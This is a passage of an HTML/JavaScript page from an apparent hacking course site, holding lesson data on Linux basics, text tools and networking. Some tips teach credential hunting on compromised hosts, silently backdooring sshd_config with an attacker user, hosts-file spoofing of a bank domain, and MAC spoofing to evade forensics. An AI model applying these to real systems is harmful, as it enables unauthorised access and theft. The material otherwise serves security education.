        <div class="cert-preamble">HackPath Academy proudly presents</div>
        <div class="cert-certifies-txt">This is to certify that</div>
        <div class="cert-name-el" id="cert-name-display">Your Full Name</div>
        <div class="cert-rule"></div>
        <div class="cert-completed-lbl">has successfully completed all requirements of</div>
        <div class="cert-course-name-el">Linux Basics for Hackers</div>
        <div class="cert-course-sub-el">Getting Started with Networking, Scripting &amp; Security in Kali</div>
        <div class="cert-author-el">by OccupyTheWeb ‚Äî No Starch Press</div>
        <div class="cert-track-el" id="cert-track-display">Linux Fundamentals &amp; Ethical Hacking</div>
        <div class="cert-stats-strip">
          <div class="css-item"><div class="css-num">17</div><div class="css-lbl">Modules</div></div>
          <div class="css-item"><div class="css-num">85+</div><div class="css-lbl">Lessons</div></div>
          <div class="css-item"><div class="css-num">500+</div><div class="css-lbl">XP Earned</div></div>
          <div class="css-item"><div class="css-num">100%</div><div class="css-lbl">Complete</div></div>
        </div>
        <div class="cert-sig-row">
          <div class="cert-sig-b"><div class="cert-sig-script">OccupyTheWeb</div><div class="cert-sig-line"></div><div class="cert-sig-name">OccupyTheWeb</div><div class="cert-sig-role">Author &amp; Course Creator</div></div>
          <div class="cert-seal"><div class="cert-seal-star">‚≠ê</div><div class="cert-seal-txt">HACK<br>PATH<br>CERTIFIED</div></div>
          <div class="cert-sig-b"><div class="cert-sig-script">HackPath Admin</div><div class="cert-sig-line"></div><div class="cert-sig-name">HackPath Academy</div><div class="cert-sig-role">Platform Director</div></div>
        </div>
      </div>
      <div class="cert-footer-strip">
        <div class="cfs-id" id="cert-id-display">CERTIFICATE ID: HP-XXXXXXXX</div>
        <div class="cfs-verify">‚úì VERIFY: academy.hackpath.io/verify</div>
      </div>
    </div><!-- end cert-preview -->

  </div>
</div>

<script>
// ===================== LESSON DATA =====================
// Each chapter has lessons[], and each lesson has its own content string.
// This fixes the bug where all lessons showed the same content.

function T(label, lines){
  return `<div class="term"><div class="th"><div class="td td-r"></div><div class="td td-o"></div><div class="td td-g"></div><div class="tl">${label}</div></div><div class="tb">${lines}</div></div>`;
}
function P(t){return `<span class="tp">kali@hackpath:~$ </span><span class="tc">${t}</span>`}
function O(t){return `<span class="to">${t}</span>`}
function COM(t){return `<span class="tcom">${t}</span>`}
function CY(t){return `<span class="tcyan">${t}</span>`}
function RE(t){return `<span class="tred">${t}</span>`}
function GR(t){return `<span class="tc" style="color:var(--green)">${t}</span>`}
function INFO(title,body){return `<div class="ibox"><div class="il">// ${title}</div>${body}</div>`}
function WARN(title,body){return `<div class="wbox"><div class="il">// ${title}</div>${body}</div>`}
function DANGER(title,body){return `<div class="rbox"><div class="il">// ${title}</div>${body}</div>`}
function TIP(title,body){return `<div class="gbox"><div class="il">// ${title}</div>${body}</div>`}

const CHAPTERS = [
{
  num:1, title:"Getting Started with the Basics", icon:"üñ•Ô∏è",
  desc:"Navigate the Linux filesystem, master terminal fundamentals, find files, understand basic commands and the Linux philosophy.",
  xp:30,
  lessons:[
    {
      name:"What is Kali Linux?",
      content:`<p>Kali Linux is a Debian-based distribution purpose-built for penetration testing and digital forensics. Maintained by Offensive Security, it ships with over 600 pre-installed tools covering every phase of an engagement ‚Äî from reconnaissance to post-exploitation.</p>
      <h3>Why Kali for Hacking?</h3>
      <p>The choice isn't arbitrary. Kali is used by professional penetration testers, CTF competitors, and security researchers worldwide because it consolidates an entire toolkit into one consistent environment. Tools like <code>nmap</code>, <code>metasploit</code>, <code>aircrack-ng</code>, <code>burpsuite</code>, and <code>wireshark</code> are pre-configured and ready.</p>
      <table><tr><th>Feature</th><th>Kali Linux</th><th>Standard Ubuntu</th></tr><tr><td>Target audience</td><td>Security professionals</td><td>General users</td></tr><tr><td>Default user</td><td>root (or kali)</td><td>Standard user</td></tr><tr><td>Pre-installed tools</td><td>600+ hacking tools</td><td>Office, browser</td></tr><tr><td>Kernel patches</td><td>Network injection patches</td><td>Standard</td></tr></table>
      ${INFO("ETHICAL USE","Everything in this course is for authorized testing only. Hacking systems without written permission is a federal crime in most countries. Always get a signed scope of work before any engagement.")}
      <h3>Setting Up Your Environment</h3>
      <p>You can run Kali as a VM inside VirtualBox or VMware, as a live USB, natively on hardware, or via WSL2 on Windows. For this course, a VirtualBox VM with 4GB RAM and 50GB disk is ideal.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("uname -a")+"<br>"+O("Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.1.27 x86_64 GNU/Linux")+"<br>"+P("cat /etc/os-release | grep PRETTY")+"<br>"+O('PRETTY_NAME="Kali GNU/Linux Rolling"')+"<br>"+P("whoami")+"<br>"+GR("root"))}`
    },
    {
      name:"The Linux Filesystem Hierarchy",
      content:`<p>Linux uses a single unified directory tree rooted at <code>/</code>. Unlike Windows drive letters, everything ‚Äî hard drives, USB sticks, network shares ‚Äî is mounted within this tree. Understanding it is essential for finding sensitive files during a pentest.</p>
      <h3>Critical Directories for Hackers</h3>
      <table><tr><th>Directory</th><th>Contents</th><th>Hacking Relevance</th></tr>
      <tr><td><code>/etc</code></td><td>System-wide config files</td><td>passwd, shadow, hosts, ssh configs</td></tr>
      <tr><td><code>/home</code></td><td>User home directories</td><td>SSH keys, bash_history, credentials</td></tr>
      <tr><td><code>/var/log</code></td><td>Log files</td><td>Auth logs, web logs, audit trails</td></tr>
      <tr><td><code>/tmp</code></td><td>Temporary files (world-writable)</td><td>Drop payloads, upload exploits</td></tr>
      <tr><td><code>/proc</code></td><td>Kernel/process virtual filesystem</td><td>Enumerate running processes, memory</td></tr>
      <tr><td><code>/dev</code></td><td>Device files</td><td>Raw disk access, /dev/null tricks</td></tr>
      <tr><td><code>/usr/bin</code></td><td>User-accessible binaries</td><td>SUID binary hunting</td></tr>
      <tr><td><code>/root</code></td><td>Root's home directory</td><td>Ultimate prize after privilege escalation</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ls /")+"<br>"+O("bin   dev  home  lib64  mnt  proc  run   srv  tmp  var<br>boot  etc  lib   media  opt  root  sbin  sys  usr")+"<br>"+P("ls -la /etc/ | head -20")+"<br>"+O("-rw-r--r--  1 root root  3028 Jan 15 08:00 bash.bashrc<br>-rw-r--r--  1 root root  1748 Jan 15 08:00 crontab<br>-rw-r-----  1 root shadow  741 Jan 15 08:00 shadow<br>-rw-r--r--  1 root root  2847 Jan 15 08:00 passwd"))}
      ${WARN("PRIME TARGET","/etc/shadow contains hashed passwords. If you find world-readable shadow files, that is a critical finding. Normal permission should be 640 (root:shadow).")}`
    },
    {
      name:"Essential Navigation Commands",
      content:`<p>The Linux terminal is your most powerful tool. Before running any exploit or scanner, you must move through the filesystem fluently. These commands form the backbone of every operation.</p>
      <h3>Navigation Fundamentals</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("pwd")+"<br>"+O("/root")+"<br>"+P("cd /var/log")+"<br>"+P("pwd")+"<br>"+O("/var/log")+"<br>"+P("ls -la")+"<br>"+O("drwxr-xr-x 12 root root  4096 Jan 15 09:00 .<br>drwxr-xr-x 14 root root  4096 Jan 15 08:00 ..<br>-rw-r--r--  1 root root 48271 Jan 15 09:14 auth.log<br>-rw-r--r--  1 root root 12094 Jan 15 09:14 syslog<br>drwxr-xr-x  2 root root  4096 Jan 15 08:00 apache2"))}
      <h3>Command Flags Deep Dive</h3>
      <table><tr><th>Command</th><th>Flags</th><th>Effect</th></tr>
      <tr><td><code>ls</code></td><td><code>-l</code></td><td>Long listing: permissions, size, owner</td></tr>
      <tr><td><code>ls</code></td><td><code>-a</code></td><td>Show hidden files (starting with .)</td></tr>
      <tr><td><code>ls</code></td><td><code>-h</code></td><td>Human-readable file sizes</td></tr>
      <tr><td><code>ls</code></td><td><code>-R</code></td><td>Recursive listing of all subdirectories</td></tr>
      <tr><td><code>cd</code></td><td><code>-</code></td><td>Return to previous directory</td></tr>
      <tr><td><code>cd</code></td><td><code>~</code></td><td>Go to home directory</td></tr>
      <tr><td><code>cd</code></td><td><code>..</code></td><td>Go up one directory level</td></tr></table>
      ${TIP("SPEED TIP","Use Tab completion constantly. Type partial commands or paths and press Tab to auto-complete. Double-Tab shows all options. This saves huge time and prevents typos.")}`
    },
    {
      name:"Finding Files & Searching the Filesystem",
      content:`<p>During a pentest, you need to locate config files, password stores, SSH keys, and interesting binaries rapidly. The <code>find</code>, <code>locate</code>, and <code>which</code> commands are indispensable.</p>
      <h3>The find Command</h3>
      <p><code>find</code> recursively searches directories applying filters ‚Äî by name, type, permissions, size, modified time, and owner. The <code>2>/dev/null</code> suppresses permission errors to keep output clean.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("find / -name 'id_rsa' 2>/dev/null")+"<br>"+GR("/home/alice/.ssh/id_rsa<br>/root/.ssh/id_rsa")+"<br>"+P("find / -name '*.conf' -type f 2>/dev/null | head -10")+"<br>"+O("/etc/ssh/sshd_config<br>/etc/apache2/apache2.conf<br>/etc/mysql/mysql.conf.d/mysqld.cnf")+"<br>"+P("find /home -name '.bash_history' 2>/dev/null")+"<br>"+GR("/home/alice/.bash_history<br>/home/bob/.bash_history"))}
      <h3>Hunting for Credentials</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("find / -name 'wp-config.php' 2>/dev/null")+"<br>"+GR("/var/www/html/wordpress/wp-config.php")+"<br>"+P("find / -name '*.env' 2>/dev/null")+"<br>"+O("/var/www/laravel/.env<br>/opt/apps/api/.env")+"<br>"+P("find / -perm /o=w -type f 2>/dev/null | head -5")+"<br>"+O("# World-writable files ‚Äî potential write targets"))}
      <h3>find vs locate vs which</h3>
      <table><tr><th>Command</th><th>Speed</th><th>When to Use</th></tr>
      <tr><td><code>find</code></td><td>Slow (real-time scan)</td><td>Fresh searches, permission-based filtering, complex queries</td></tr>
      <tr><td><code>locate</code></td><td>Fast (cached DB)</td><td>Quick name search; update with <code>updatedb</code></td></tr>
      <tr><td><code>which</code></td><td>Instant</td><td>Find where a binary is in PATH</td></tr>
      <tr><td><code>whereis</code></td><td>Instant</td><td>Binary + man pages + source locations</td></tr></table>
      ${INFO("HACKER WORKFLOW","On a newly compromised box, run: <code>find / -name '*.txt' -o -name '*.cfg' -o -name '*.conf' 2>/dev/null | xargs grep -l 'password' 2>/dev/null</code> to spider for credentials across all config files instantly.")}`
    },
    {
      name:"Viewing & Manipulating Files",
      content:`<p>Reading, editing, and manipulating file contents without a GUI is a daily reality in security work. These commands are your eyes and hands on a remote system.</p>
      <h3>Reading Files</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /etc/passwd")+"<br>"+O("root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>alice:x:1001:1001:Alice,,,:/home/alice:/bin/bash")+"<br>"+P("cat /etc/passwd | cut -d: -f1")+"<br>"+O("root<br>daemon<br>alice<br>bob")+"<br>"+COM("# Extract just usernames from passwd"))}
      <h3>head, tail, and less</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("head -20 /var/log/auth.log")+"<br>"+O("Jan 15 08:00:01 kali CRON[1234]: pam_unix(cron:session): session opened...")+"<br>"+P("tail -50 /var/log/auth.log | grep 'Failed'")+"<br>"+RE("Jan 15 09:11:22 kali sshd[5421]: Failed password for root from 10.0.0.1")+"<br>"+P("tail -f /var/log/auth.log")+"<br>"+O("# Live monitoring ‚Äî watch logins in real time"))}
      <h3>Creating and Editing Files</h3>
      <p>Kali includes several text editors. <code>nano</code> is beginner-friendly; <code>vim</code> is the professional choice for speed. When scripting exploits, you need to be comfortable writing files from the command line.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo 'Hello World' > test.txt")+"<br>"+P("echo 'Second line' >> test.txt")+"<br>"+COM("# > overwrites, >> appends")+"<br>"+P("cat test.txt")+"<br>"+O("Hello World<br>Second line")+"<br>"+P("nano recon_notes.txt")+"<br>"+O("[Ctrl+O to save, Ctrl+X to exit]"))}
      ${WARN("OVERWRITE DANGER","The single <code>></code> redirect silently overwrites a file without warning. This is one of the most common mistakes that destroys data. Always double-check before redirecting to an existing file.")}`
    }
  ],
  quiz:[
    {q:"Which directory contains system-wide configuration files?",opts:["/home","/etc","/usr","/var"],ans:1},
    {q:"What does 'find / -perm -4000 2>/dev/null' search for?",opts:["World-writable files","Files owned by root","SUID bit files","Hidden files"],ans:2},
    {q:"What does '2>/dev/null' do?",opts:["Redirects stdout to null","Redirects stderr to null","Duplicates output","Runs command as root"],ans:1}
  ]
},
{
  num:2, title:"Text Manipulation", icon:"üìù",
  desc:"Master grep, sed, awk, cut, and pipes to slice through log files, configs, and output like a pro.",
  xp:25,
  lessons:[
    {
      name:"Displaying & Filtering Text with cat, head, tail",
      content:`<p>Hackers deal with enormous volumes of text ‚Äî logs, configs, scan results, network captures. The ability to quickly navigate and filter this text separates efficient professionals from frustrated ones.</p>
      <h3>The cat Command ‚Äî Full File Display</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat -n /etc/passwd")+"<br>"+O("     1	root:x:0:0:root:/root:/bin/bash<br>     2	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>     3	alice:x:1001:1001::/home/alice:/bin/bash")+"<br>"+COM("# -n shows line numbers ‚Äî useful when referencing specific lines")+"<br>"+P("tac /etc/hosts")+"<br>"+O("# tac prints file in reverse order ‚Äî last line first"))}
      <h3>head and tail ‚Äî Targeted Viewing</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("head -5 /var/log/syslog")+"<br>"+O("Jan 15 08:00:01 kali kernel: Linux version 6.1.0-kali9")+"<br>"+P("tail -100 /var/log/auth.log | grep 'Jan 15 09'")+"<br>"+O("Jan 15 09:14:22 kali sshd[5421]: Accepted key for alice")+"<br>"+P("tail -f /var/log/apache2/access.log")+"<br>"+GR("# Live feed of web server access ‚Äî watch for attacks in real time"))}`
    },
    {
      name:"grep ‚Äî Search Like a Hacker",
      content:`<p><code>grep</code> (Global Regular Expression Print) is arguably the most important text tool in a hacker's arsenal. It finds patterns in files or piped input. Learn every flag.</p>
      <h3>Essential grep Flags</h3>
      <table><tr><th>Flag</th><th>Meaning</th><th>Example</th></tr>
      <tr><td><code>-i</code></td><td>Case-insensitive</td><td><code>grep -i "password" config.txt</code></td></tr>
      <tr><td><code>-r</code></td><td>Recursive through dirs</td><td><code>grep -r "api_key" /var/www/</code></td></tr>
      <tr><td><code>-n</code></td><td>Show line numbers</td><td><code>grep -n "root" /etc/passwd</code></td></tr>
      <tr><td><code>-v</code></td><td>Invert match (exclude)</td><td><code>grep -v "^#" /etc/ssh/sshd_config</code></td></tr>
      <tr><td><code>-l</code></td><td>List matching filenames only</td><td><code>grep -rl "password" /etc/</code></td></tr>
      <tr><td><code>-c</code></td><td>Count matches</td><td><code>grep -c "Failed" auth.log</code></td></tr>
      <tr><td><code>-A 3</code></td><td>3 lines after match</td><td><code>grep -A 3 "error" app.log</code></td></tr>
      <tr><td><code>-B 2</code></td><td>2 lines before match</td><td><code>grep -B 2 "crash" debug.log</code></td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("grep -rn 'password' /var/www/ 2>/dev/null")+"<br>"+GR("/var/www/html/config.php:14:  $password = 'Sup3rS3cr3t!';")+"<br>"+P("grep -v '^#' /etc/ssh/sshd_config | grep -v '^$'")+"<br>"+O("PermitRootLogin prohibit-password<br>PubkeyAuthentication yes<br>PasswordAuthentication no")+"<br>"+COM("# Remove comments and blank lines to read configs cleanly"))}
      ${INFO("REGEX POWER","Combine grep with regex for surgical precision: <code>grep -E '^[0-9]{1,3}\\.[0-9]{1,3}' file</code> matches IP addresses. <code>grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-z]{2,}'</code> extracts email addresses from any file.")}`
    },
    {
      name:"sed ‚Äî Stream Editor",
      content:`<p><code>sed</code> edits text streams without opening a file. It's used to find and replace, delete lines, insert text, and transform output ‚Äî critical for automating config changes during post-exploitation.</p>
      <h3>Find and Replace</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo 'PasswordAuthentication yes' | sed 's/yes/no/'")+"<br>"+O("PasswordAuthentication no")+"<br>"+P("sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config")+"<br>"+COM("# -i edits the file in-place ‚Äî no backup by default")+"<br>"+P("sed -i.bak 's/old/new/g' config.txt")+"<br>"+COM("# .bak creates backup before editing"))}
      <h3>Delete Lines & Extract Sections</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("sed '/^#/d' /etc/ssh/sshd_config")+"<br>"+O("# All comment lines removed")+"<br>"+P("sed -n '10,20p' /var/log/auth.log")+"<br>"+O("# Print only lines 10‚Äì20")+"<br>"+P("cat /etc/passwd | sed 's/:.*//'")+"<br>"+O("root<br>daemon<br>alice")+"<br>"+COM("# Remove everything after first colon ‚Äî extracts usernames"))}
      ${TIP("AUTOMATION USE","In post-exploitation, use sed to backdoor config files silently: <code>sed -i '/AllowUsers/a AllowUsers hacker' /etc/ssh/sshd_config</code> ‚Äî adds attacker's user to allowed SSH users without touching other lines.")}`
    },
    {
      name:"awk ‚Äî Structured Data Extraction",
      content:`<p><code>awk</code> is a full programming language designed for structured text. It processes files line by line, splitting each into fields. For log analysis and credential extraction, nothing beats it.</p>
      <h3>awk Fundamentals</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("awk -F: '{print $1}' /etc/passwd")+"<br>"+O("root<br>daemon<br>alice<br>bob")+"<br>"+COM("# -F: sets field separator to colon, $1 = first field")+"<br>"+P("awk -F: '{print $1, $3}' /etc/passwd")+"<br>"+O("root 0<br>daemon 1<br>alice 1001")+"<br>"+COM("# Print username and UID side by side")+"<br>"+P("awk -F: '$3==0 {print $1}' /etc/passwd")+"<br>"+GR("root")+"<br>"+COM("# Find all UID 0 (root) accounts ‚Äî detect rootkits adding backdoor roots"))}
      <h3>Log Analysis with awk</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head")+"<br>"+O("     342 192.168.1.105<br>      87 10.0.0.99<br>      14 172.16.20.1")+"<br>"+COM("# Top attackers by failed SSH login count ‚Äî instant threat intel")+"<br>"+P("awk '/Failed/ {count[$11]++} END {for(ip in count) print count[ip], ip}' auth.log | sort -rn")+"<br>"+O("342 192.168.1.105<br>87 10.0.0.99"))}`
    },
    {
      name:"Pipes, Redirection & cut",
      content:`<p>Pipes (<code>|</code>) chain commands so the output of one becomes input for the next. This is the Unix philosophy: small tools doing one thing well, combined for complex tasks. Mastering pipes multiplies your effectiveness.</p>
      <h3>Pipes in Practice</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /etc/passwd | cut -d: -f1 | sort")+"<br>"+O("alice<br>bob<br>daemon<br>root")+"<br>"+P("ps aux | grep -v 'grep' | grep 'ssh'")+"<br>"+O("root   1234  0.0  0.1  9876 2048 ?  Ss  08:21  0:00 /usr/sbin/sshd")+"<br>"+P("netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq")+"<br>"+GR("10.0.0.5<br>192.168.1.42")+"<br>"+COM("# All currently connected IPs"))}
      <h3>Redirection Operators</h3>
      <table><tr><th>Operator</th><th>Action</th><th>Example</th></tr>
      <tr><td><code>&gt;</code></td><td>Redirect stdout (overwrite)</td><td><code>nmap 10.0.0.1 &gt; scan.txt</code></td></tr>
      <tr><td><code>&gt;&gt;</code></td><td>Redirect stdout (append)</td><td><code>echo "note" &gt;&gt; notes.txt</code></td></tr>
      <tr><td><code>2&gt;</code></td><td>Redirect stderr</td><td><code>command 2&gt; errors.log</code></td></tr>
      <tr><td><code>&amp;&gt;</code></td><td>Redirect both stdout+stderr</td><td><code>nmap &amp;&gt; full.log</code></td></tr>
      <tr><td><code>&lt;</code></td><td>Read from file as stdin</td><td><code>sort &lt; names.txt</code></td></tr>
      <tr><td><code>|</code></td><td>Pipe: stdout ‚Üí next stdin</td><td><code>ps aux | grep python</code></td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("nmap -sV 192.168.1.0/24 2>/dev/null | tee scan_results.txt | grep 'open'")+"<br>"+O("22/tcp  open  ssh     OpenSSH 8.4<br>80/tcp  open  http    Apache 2.4.51<br>3306/tcp open mysql  MySQL 5.7")+"<br>"+COM("# tee writes to file AND shows output simultaneously"))}`
    }
  ],
  quiz:[
    {q:"grep -r 'password' /etc/ does what?",opts:["Searches current dir only","Recursively searches /etc/ for 'password'","Removes files with 'password'","Replaces 'password' with nothing"],ans:1},
    {q:"In awk -F: '{print $1}' /etc/passwd, what is $1?",opts:["Second field","First character","First field","The field separator"],ans:2},
    {q:"Which operator appends output to a file without overwriting?",opts:[">",">>","<","2>"],ans:1}
  ]
},
{
  num:3, title:"Analyzing & Managing Networks", icon:"üåê",
  desc:"Scan networks, analyze traffic, manipulate DNS, spoof MAC addresses, and understand TCP/IP deeply.",
  xp:30,
  lessons:[
    {
      name:"TCP/IP & Networking Fundamentals",
      content:`<p>Every hacking operation operates over networks. Understanding TCP/IP at a deep level lets you exploit protocol weaknesses, evade detection, and understand exactly what your tools are doing under the hood.</p>
      <h3>The OSI Model ‚Äî Hacker's View</h3>
      <table><tr><th>Layer</th><th>Name</th><th>Protocol Examples</th><th>Hacking Relevance</th></tr>
      <tr><td>7</td><td>Application</td><td>HTTP, SSH, DNS, FTP</td><td>SQLi, XSS, command injection</td></tr>
      <tr><td>4</td><td>Transport</td><td>TCP, UDP</td><td>Port scanning, session hijacking</td></tr>
      <tr><td>3</td><td>Network</td><td>IP, ICMP</td><td>Routing, IP spoofing, ping sweeps</td></tr>
      <tr><td>2</td><td>Data Link</td><td>Ethernet, ARP</td><td>ARP poisoning, MAC spoofing</td></tr>
      <tr><td>1</td><td>Physical</td><td>Cables, WiFi signals</td><td>Signal capture, wireless attacks</td></tr></table>
      <h3>TCP Three-Way Handshake</h3>
      <p>Understanding the TCP handshake is critical for port scanning. When nmap sends a SYN and gets a SYN-ACK back, it knows the port is open. When it gets RST, the port is closed. When it gets nothing, the port is filtered by a firewall.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("nc -vz 192.168.1.1 80")+"<br>"+GR("Connection to 192.168.1.1 80 port [tcp/http] succeeded!")+"<br>"+P("nc -vz 192.168.1.1 23")+"<br>"+RE("nc: connect to 192.168.1.1 port 23 (tcp) failed: Connection refused")+"<br>"+COM("# Port 80 open (SYN-ACK), port 23 closed (RST)"))}`
    },
    {
      name:"ifconfig, ip & Network Interface Management",
      content:`<p>Knowing your network configuration is step one of any engagement. The older <code>ifconfig</code> and modern <code>ip</code> command let you inspect, configure, and manipulate your own interfaces ‚Äî and those of target systems.</p>
      <h3>Interface Inspection</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ip addr show")+"<br>"+O("1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536<br>    link/loopback 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500<br>    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.101/24 brd 192.168.1.255 scope global eth0")+"<br>"+P("ip route show")+"<br>"+O("default via 192.168.1.1 dev eth0<br>192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.101"))}
      <h3>Assigning IPs & Bringing Interfaces Up/Down</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ip addr add 192.168.1.200/24 dev eth0")+"<br>"+P("ip link set eth0 down && ip link set eth0 up")+"<br>"+COM("# Cycle interface to apply changes")+"<br>"+P("ip addr add 10.10.10.50/8 dev eth0:1")+"<br>"+COM("# Add a virtual interface with alias ‚Äî useful for multi-network ops"))}`
    },
    {
      name:"nmap ‚Äî Network Mapping & Port Scanning",
      content:`<p>nmap is the world's most powerful network scanner. Every penetration tester uses it. Understanding every scan type, flag, and output format is non-negotiable.</p>
      <h3>Scan Types Explained</h3>
      <table><tr><th>Scan Type</th><th>Flag</th><th>How It Works</th><th>Use Case</th></tr>
      <tr><td>SYN Scan (Stealth)</td><td><code>-sS</code></td><td>Half-open ‚Äî send SYN, don't complete handshake</td><td>Default; stealthier, faster</td></tr>
      <tr><td>Connect Scan</td><td><code>-sT</code></td><td>Full TCP handshake</td><td>When root not available</td></tr>
      <tr><td>UDP Scan</td><td><code>-sU</code></td><td>Sends UDP probes</td><td>DNS(53), SNMP(161), NTP(123)</td></tr>
      <tr><td>Version Detect</td><td><code>-sV</code></td><td>Probe open ports for service version</td><td>Identify vulnerable versions</td></tr>
      <tr><td>OS Detection</td><td><code>-O</code></td><td>Fingerprint OS from TCP stack</td><td>Tailor exploits to OS</td></tr>
      <tr><td>Script Scan</td><td><code>-sC</code></td><td>Run default NSE scripts</td><td>Vuln checks, banner grabs</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("nmap -sV -sC -O -p- --min-rate=1000 192.168.1.50 -oA full_scan")+"<br>"+O("Starting Nmap 7.94 ( https://nmap.org )<br>Nmap scan report for 192.168.1.50<br>PORT     STATE SERVICE  VERSION<br>22/tcp   open  ssh      OpenSSH 7.9 (Ubuntu)<br>80/tcp   open  http     Apache httpd 2.4.29<br>| http-title: Apache2 Ubuntu Default Page<br>3306/tcp open  mysql    MySQL 5.7.33<br>OS: Linux 4.15 - 5.8<br>OS CPE: cpe:/o:linux:linux_kernel")+"<br>"+COM("# -oA saves in all 3 formats: .nmap, .gnmap, .xml"))}`
    },
    {
      name:"DNS Analysis & Manipulation",
      content:`<p>DNS is the phone book of the internet ‚Äî and it reveals enormous amounts of intelligence about a target. Subdomain enumeration, zone transfers, and DNS poisoning are core recon and attack techniques.</p>
      <h3>DNS Reconnaissance</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("host example.com")+"<br>"+O("example.com has address 93.184.216.34<br>example.com mail is handled by 10 mail.example.com")+"<br>"+P("nslookup -type=MX example.com")+"<br>"+O("Mail exchange = 10 mail.example.com")+"<br>"+P("dig example.com ANY +noall +answer")+"<br>"+O("example.com. 86400 IN A 93.184.216.34<br>example.com. 3600  IN MX 10 mail.example.com<br>example.com. 86400 IN NS ns1.example.com"))}
      <h3>DNS Zone Transfer (AXFR)</h3>
      <p>A misconfigured DNS server will transfer its entire zone file to any requestor ‚Äî revealing every subdomain and internal host. This is a critical misconfiguration to test for.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("dig @ns1.target.com target.com AXFR")+"<br>"+GR("; <<>> DiG 9.18 <<>> @ns1.target.com target.com AXFR<br>target.com.     SOA ns1.target.com. admin.target.com.<br>mail.target.com.     A 192.168.1.10<br>dev.target.com.      A 10.0.0.50<br>staging.target.com.  A 10.0.0.51<br>internal.target.com. A 10.10.0.1")+"<br>"+COM("# Full internal network map from one DNS request!"))}
      <h3>DNS Spoofing via /etc/hosts</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo '10.10.10.5  bankofamerica.com' >> /etc/hosts")+"<br>"+COM("# Now all DNS requests for bankofamerica.com resolve to our server")+"<br>"+COM("# Used in phishing labs and local testing"))}`
    },
    {
      name:"Spoofing MAC Addresses",
      content:`<p>Your MAC address identifies your network card at Layer 2. Changing it provides anonymity on a network and can bypass MAC-based access controls (MAC filtering on WiFi).</p>
      <h3>Why MAC Spoofing Matters</h3>
      <ul><li>Bypass MAC-address-filtered WiFi networks</li><li>Evade forensic identification of your physical hardware</li><li>Impersonate other devices on the network</li><li>Reset DHCP lease to get a new IP address</li></ul>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ip link show eth0 | grep ether")+"<br>"+O("link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff")+"<br>"+P("ip link set eth0 down")+"<br>"+P("ip link set eth0 address 00:11:22:33:44:55")+"<br>"+P("ip link set eth0 up")+"<br>"+P("ip link show eth0 | grep ether")+"<br>"+GR("link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff")+"<br>"+COM("# MAC successfully spoofed!"))}
      <h3>Using macchanger</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("macchanger -r eth0")+"<br>"+O("Current MAC:   08:00:27:ab:cd:ef (CADMUS COMPUTER SYSTEMS)<br>Permanent MAC: 08:00:27:ab:cd:ef (CADMUS COMPUTER SYSTEMS)<br>New MAC:       dc:a6:32:f9:c1:42 (Raspberry Pi Trading Ltd)")+"<br>"+P("macchanger --mac=00:de:ad:be:ef:00 eth0")+"<br>"+COM("# Set any MAC manually ‚Äî use known vendor MACs to blend in"))}
      ${WARN("REVERTING","Always revert your MAC when done: <code>macchanger -p eth0</code> or simply reboot. Persistent spoofed MACs can cause network issues.")}`
    }
  ],
  quiz:[
    {q:"What does nmap -sS perform?",opts:["Full TCP connect scan","SYN stealth scan","UDP scan","Script scan"],ans:1},
    {q:"A DNS zone transfer (AXFR) exposes:",opts:["SSL certificates","All DNS records including internal hosts","Only MX records","Router configurations"],ans:1},
    {q:"Which command changes your MAC address using ip?",opts:["ip mac set","ip link set eth0 address XX:XX","ifconfig mac change","arp -s"],ans:1}
  ]
},
{
  num:4, title:"Software Management", icon:"üì¶",
  desc:"Master apt, manage repositories, install hacking tools, compile from source, and keep Kali lean.",
  xp:20,
  lessons:[
    {
      name:"apt ‚Äî The Package Manager",
      content:`<p>Kali's package manager <code>apt</code> (Advanced Package Tool) handles installation, removal, and upgrading of software and their dependencies automatically. Mastering it keeps your toolkit current and organized.</p>
      <h3>Core apt Commands</h3>
